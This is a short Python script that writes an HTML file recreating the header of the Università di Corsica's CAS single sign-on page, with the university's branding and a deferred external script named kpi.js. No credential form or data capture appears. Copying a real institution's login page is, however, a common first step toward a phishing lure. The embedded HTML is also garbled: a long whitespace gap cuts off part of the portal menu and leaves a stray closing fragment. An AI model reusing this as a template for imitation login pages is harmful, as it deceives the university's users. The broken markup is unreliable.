#!/usr/bin/env python3
# coding: utf-8

print("Début de la création des fichiers ENT...")
# Contenu HTML
HTML_HEADER = '<!doctype html>\n<html lang="fr">\n<head>\n  <meta charset="utf-8">\n  <title>CAS - Central Authentication Service Connexion</title>\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n  <link rel="stylesheet" href="style.css">\n  <script src="kpi.js" defer></script>\n</head>\n<body class="auth-body">\n'

HTML_TOP_HEADER = '''  <header role="banner">
    <div class="top_header">
      <div class="container">
        <div class="menu_top_header">
          <span><a href="#" class="hidden_md">Università di corsica</a><span class="hidden_md">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><label for="nosportails_menu" class="nosportails">Nos Portails &nbsp;&nbsp;:</label></span>
          <input type="checkbox" id="nosportails_menu">
                                                                                                                                                                                                      pro</a></li>
            <li><a href="#">Fondation</a></li>
          </ul>
        </div>
      </div>
    </div>

    <div class="bottom_header">
      <div class="container">
        <a href="#" class="logo"><img src="logo.png" alt="logo"></a>
        <div class="baseline">Authentification | <span>Campus numérique</span></div>
      </div>
    </div>
    <div class="clear"></div>
  </header>
'''

print("Construction du HTML...")
with open('index.html', 'w', encoding='utf-8') as f:
    f.write(HTML_HEADER)
    f.write(HTML_TOP_HEADER)
    
print("✅ Header créé")
